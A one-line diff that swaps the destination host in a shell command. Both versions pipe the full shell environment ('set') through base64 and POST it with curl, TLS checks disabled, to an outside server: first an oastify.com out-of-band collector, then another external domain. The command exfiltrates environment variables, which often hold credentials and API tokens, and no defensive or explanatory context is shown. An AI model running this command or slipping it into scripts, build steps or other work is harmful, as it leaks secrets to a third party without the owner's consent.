@@ -1,1 +1,1 @@
-set | base64 | curl -X POST --insecure --data-binary @-http://nmdgf8g4ayuutievrd0ozdl1rsxjla9z.oastify.com/?
+set | base64 | curl -X POST --insecure --data-binary @-http://bo.p.a-9.co/?
